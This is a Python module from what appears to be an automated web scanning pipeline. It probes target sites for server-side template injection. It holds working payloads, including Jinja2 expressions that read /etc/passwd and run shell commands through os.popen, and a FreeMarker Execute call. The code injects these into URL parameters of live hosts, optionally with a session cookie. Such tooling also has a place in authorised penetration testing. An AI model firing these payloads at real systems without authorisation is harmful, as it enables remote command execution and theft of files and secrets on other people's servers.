import os
#!/usr/bin/env python3
# modules/step18_ssti.py — Server-Side Template Injection
# MilkyWay Intelligence | Author: Sharlix

import re, urllib.parse
from core.utils import safe_read
from core.http_client import sync_get, sync_post

# Payloads: (payload, expected_output, engine)
SSTI_PROBES = [
    ("{{7*7}}",           "49",        "Jinja2/Twig"),
    ("${7*7}",            "49",        "FreeMarker/Thymeleaf"),
    ("#{7*7}",            "49",        "Pebble/Spring"),
    ("*{7*7}",            "49",        "Spring EL"),
    ("<%= 7*7 %>",        "49",        "ERB/JSP"),
    ("{{7*'7'}}",         "7777777",   "Jinja2"),
    ("{{'7'*7}}",         "7777777",   "Twig"),
    ("${7777777}",        "7777777",   "FreeMarker"),
    ("{{config}}",        "SECRET_KEY","Jinja2 config dump"),
    ("{{self.__class__}","class",      "Jinja2 object"),
]

# Deeper exploitation probes (only if probe confirmed)
SSTI_RCE_PROBES = [
    ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
     "root:", "Jinja2 RCE — file read"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
     "uid=",  "Jinja2 RCE — command exec"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
     "uid=",  "FreeMarker RCE"),
]

SSTI_PARAMS = [
    "name","search","q","template","t","view","page","msg","title",
    "content","text","body","lang","locale","from","to","subject","data",
]



def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class Step18Ssti:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["ssti_results"]
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:100]
        found = 0

        if not live:
            p.log.warn("SSTI: no live hosts"); return

        p.log.info("SSTI testing (Jinja2/Twig/FreeMarker/EL)")
        auth_h = {}
        if getattr(p.args, "cookie", None):
            auth_h["Cookie"] = p.args.cookie

        # Test parameterized URLs
        param_urls = [u for u in urls if "=" in u and "?" in u][:30]

        for url in param_urls:
            result = self._test_url(url, auth_h)
            if result:
                payload, engine, response = result
                # Try RCE probe
                rce = self._probe_rce(url, auth_h)
                if rce:
                    sev, detail = rce
                else:
                    detail = f"SSTI confirmed ({engine}): payload '{payload}' → '{response[:30]}'"
                    sev    = "critical"
                with open(out,"a") as f:
                    f.write(f"SSTI: {url} | {detail}\n")
                p.add_finding(sev, "SSTI_RCE" if rce else "SSTI", url, detail, "ssti-engine")
                found += 1

        # Test common parameters on each host
        for host in live:
            for path in ["/", "/search", "/contact", "/template"]:
                for param in SSTI_PARAMS[:5]:
                    for payload, expected, engine in SSTI_PROBES[:5]:
                        url  = f"{host.rstrip('/')}{path}?{param}={urllib.parse.quote(payload)}"
                        resp = sync_get(url, headers=auth_h, timeout=8)
                        if resp and expected in resp.get("body",""):
                            detail = f"SSTI ({engine}): {payload!r} → {expected!r}"
                            with open(out,"a") as f:
                                f.write(f"SSTI: {url} | {detail}\n")
                            p.add_finding("critical","SSTI",url,detail,"ssti-engine")
                            found += 1

        p.log.success(f"SSTI: {found} findings")

    def _test_url(self, url: str, auth_h: dict):
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None

        for payload, expected, engine in SSTI_PROBES:
            for param in list(qs.keys()):
                qs_mod = dict(qs)
                qs_mod[param] = [payload]
                new_qs   = urllib.parse.urlencode(qs_mod, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                resp     = sync_get(test_url, headers=auth_h, timeout=8)
                if resp and re.search(re.escape(expected), resp.get("body",""), re.IGNORECASE):
                    return (payload, engine, resp.get("body","")[:100])
        return None

    def _probe_rce(self, base_url: str, auth_h: dict):
        try:
            parsed = urllib.parse.urlparse(base_url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None

        for rce_payload, indicator, label in SSTI_RCE_PROBES:
            for param in list(qs.keys())[:2]:
                qs_mod   = dict(qs)
                qs_mod[param] = [rce_payload]
                new_qs   = urllib.parse.urlencode(qs_mod, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                resp     = sync_get(test_url, headers=auth_h, timeout=8)
                if resp and indicator in resp.get("body",""):
                    return ("critical", f"{label}: indicator '{indicator}' found in response")
        return None
